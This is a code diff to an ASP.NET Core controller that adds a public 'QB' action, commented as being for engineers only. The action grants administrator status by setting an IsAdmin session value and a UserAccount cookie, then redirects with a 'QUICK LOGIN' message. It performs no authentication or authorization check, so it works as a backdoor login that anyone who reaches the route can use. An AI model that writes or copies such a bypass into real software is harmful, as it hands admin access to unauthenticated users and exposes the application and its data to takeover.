@@ -857,6 +857,19 @@ namespace Core_CodeFirst.Controllers
             }
         }
 
+        //for Enginner only
+        public IActionResult QB()
+        {
+            ViewData["IsAdmin"] = "YES";
+            HttpContext.Response.Cookies.Append("UserAccount", "AKA");
+            SetMySession("IsAdmin", "YES");
+            //return Json(new { result = "PASS", detail = "matched" });
+            //return Content("Quick Login");
+            TempData["td_serverMessage"] = "QUICK LOGIN";
+            return RedirectToAction("Index");
+        }
+
+
         //::<Timmy><Dec 18,2023><my api for session>
         public bool SetMySession(string key, string val)
         {
